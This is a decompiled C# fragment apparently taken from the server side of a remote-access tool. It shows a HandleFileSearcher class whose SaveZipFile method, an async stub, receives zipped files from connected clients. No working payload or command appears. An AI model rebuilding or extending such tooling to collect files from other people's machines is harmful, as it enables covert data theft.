using System;
using System.Runtime.CompilerServices;
using Server.Connection;
using Server.MessagePack;

namespace Server.Handle_Packet
{
	// Token: 0x02000040 RID: 64
	public class HandleFileSearcher
	{
		// Token: 0x060002D4 RID: 724 RVA: 0x000158B8 File Offset: 0x000158B8
		public void SaveZipFile(Clients client, MsgPack unpack_msgpack)
		{
			HandleFileSearcher.<SaveZipFile>d__0 <SaveZipFile>d__;
			<SaveZipFile>d__.<>t__builder = AsyncVoidMethodBuilder.Create();
			<SaveZipFile>d__.client = client;
			<SaveZipFile>d__.unpack_msgpack = unpack_msgpack;
			<SaveZipFile>d__.<>1__state = -1;
			<SaveZipFile>d__.<>t__builder.Start<HandleFileSearcher.<SaveZipFile>d__0>(ref <SaveZipFile>d__);
		}
	}
}
